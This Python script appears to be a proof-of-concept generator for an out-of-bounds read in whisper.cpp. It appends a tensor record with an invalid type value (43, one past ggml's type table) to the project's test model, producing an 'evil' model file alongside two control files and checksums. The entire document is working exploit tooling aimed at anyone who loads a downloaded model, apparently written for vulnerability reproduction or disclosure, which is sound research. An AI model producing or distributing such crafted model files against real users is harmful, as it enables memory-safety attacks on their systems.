#!/usr/bin/env python3
"""Generate the three model artifacts for the whisper.cpp tensor-ttype OOB read PoC.

The attacker's entire capability is ONE file: a legacy whisper `ggml-*.bin`
model - the format every whisper.cpp user downloads and passes to `-m`.

Base file: upstream whisper.cpp's OWN test fixture
`models/for-tests-ggml-tiny.bin` (a valid legacy header + mel filters + vocab,
with zero tensor records).  We append exactly one tensor record, laid out in the
order the project's own writer emits it
(`models/convert-pt-to-ggml.py:331-334`: struct.pack("iii", n_dims, len(name),
ftype), then the dims, then the name bytes, then the data):

    int32 n_dims
    int32 length          # byte length of the tensor name
    int32 ttype           # <-- the field under test
    int32 ne[n_dims]
    bytes name[length]
    bytes data[ggml_nbytes]

  model_base.bin    -- the upstream fixture, untouched            (control A)
  model_benign.bin  -- base + one record with ttype = 0 (F32)     (control B)
  model_evil.bin    -- base + the SAME record with ttype = 43     (positive)

43 == GGML_TYPE_COUNT in this tree (ggml/include/ggml.h:433), i.e. the first
value one past the end of ggml's global `type_traits[GGML_TYPE_COUNT]` table
(ggml/src/ggml.c:632).  model_benign.bin and model_evil.bin differ in exactly
one byte.

Usage:
    python3 make_poc.py [path-to-whisper.cpp-checkout]

Artifacts are written to ./artifact/ relative to the current working directory,
together with artifact_meta.json and SHA256SUMS.txt.
"""
import hashlib
import json
import pathlib
import struct
import sys

TENSOR_NAME = b"encoder.ln_post.bias"   # src/whisper-arch.h:52
N_AUDIO_STATE = 384                     # hparams.n_audio_state in the fixture
GGML_TYPE_F32 = 0
GGML_TYPE_COUNT = 43                    # ggml/include/ggml.h:433


def record(ttype):
    body = struct.pack("<iii", 1, len(TENSOR_NAME), ttype)
    body += struct.pack("<i", N_AUDIO_STATE)
    body += TENSOR_NAME
    # ggml_nbytes(encoder.ln_post.bias) == n_audio_state * sizeof(float)
    body += b"".join(struct.pack("<f", (i % 97) / 97.0 - 0.5)
                     for i in range(N_AUDIO_STATE))
    return body


def sha256(p):
    h = hashlib.sha256()
    h.update(pathlib.Path(p).read_bytes())
    return h.hexdigest()


def main():
    src = pathlib.Path(sys.argv[1] if len(sys.argv) > 1 else ".")
    out = pathlib.Path("artifact")
    out.mkdir(parents=True, exist_ok=True)

    base = (src / "models" / "for-tests-ggml-tiny.bin").read_bytes()
    assert base[:4] == b"lmgg", "unexpected magic in the upstream fixture"

    paths = {
        "base": (out / "model_base.bin", base),
        "benign": (out / "model_benign.bin", base + record(GGML_TYPE_F32)),
        "evil": (out / "model_evil.bin", base + record(GGML_TYPE_COUNT)),
    }
    meta = {}
    for k, (p, data) in paths.items():
        p.write_bytes(data)
        meta[k] = {"path": p.name, "sha256": sha256(p), "size": p.stat().st_size}
    meta["base_fixture"] = "whisper.cpp models/for-tests-ggml-tiny.bin"
    meta["tensor_name"] = TENSOR_NAME.decode()
    meta["benign_ttype"] = GGML_TYPE_F32
    meta["evil_ttype"] = GGML_TYPE_COUNT
    diff_positions = [i for i, (a, b) in
                      enumerate(zip(paths["benign"][1], paths["evil"][1])) if a != b]
    meta["bytes_differing_benign_vs_evil"] = len(diff_positions)
    meta["differing_byte_offsets"] = diff_positions
    (out / "artifact_meta.json").write_text(json.dumps(meta, indent=2) + "\n")

    with (out / "SHA256SUMS.txt").open("w", newline="\n") as f:
        for k in ("base", "benign", "evil"):
            p = paths[k][0]
            f.write(f"{sha256(p)}  {p.name}\n")

    print(json.dumps(meta, indent=2))


if __name__ == "__main__":
    main()
